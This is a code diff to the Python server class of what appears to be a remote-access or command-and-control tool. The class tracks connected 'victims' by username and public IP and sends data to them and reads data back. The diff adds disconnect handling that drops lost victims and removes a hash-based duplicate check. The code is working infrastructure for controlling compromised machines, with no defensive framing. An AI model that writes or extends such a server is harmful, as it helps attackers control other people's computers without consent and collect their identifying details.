@@ -1,4 +1,4 @@
-import json, select, socket, hashlib
+import json, select, socket
 
 from const import Const
 from victim import Victim
@@ -12,13 +12,23 @@ class Server:
 
         self.victims: list[Victim] = []
 
-    def send_to_victim(self, index: int, data: str) -> None:
-        sock = self.victims[index].socket
-        sock.send(data.encode(encoding=Const.ENCODING))
+    def send_to_victim(self, index: int, data: str) -> bool:
+        try:
+            sock = self.victims[index].socket
+            sock.send(data.encode(encoding=Const.ENCODING))
+        except:
+            info = self.victims.pop(index).info
+            errmsg = f'{info['username']}@{info['public_ip']}'
+            raise ConnectionError(f'[-] {errmsg} disconnected')
 
-    def get_from_victim(self, index: int) -> str:
-        sock = self.victims[index].socket
-        return sock.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)
+    def get_from_victim(self, index: int) -> str | bool:
+        try:
+            sock = self.victims[index].socket
+            return sock.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)
+        except:
+            info = self.victims.pop(index).info
+            errmsg = f'{info['username']}@{info['public_ip']}'
+            raise ConnectionError(f'[-] {errmsg} disconnected')
 
     def stop(self) -> None:
         self.server.close()
@@ -46,12 +56,6 @@ class Server:
 
                         if not data:
                             sock.close()
-                            inputs.remove(sock)
-                            continue
-
-                        info_hash: str = hashlib.sha256(data).hexdigest()
-
-                        if info_hash in self.victims:
                             inputs.remove(sock)
                             continue
 
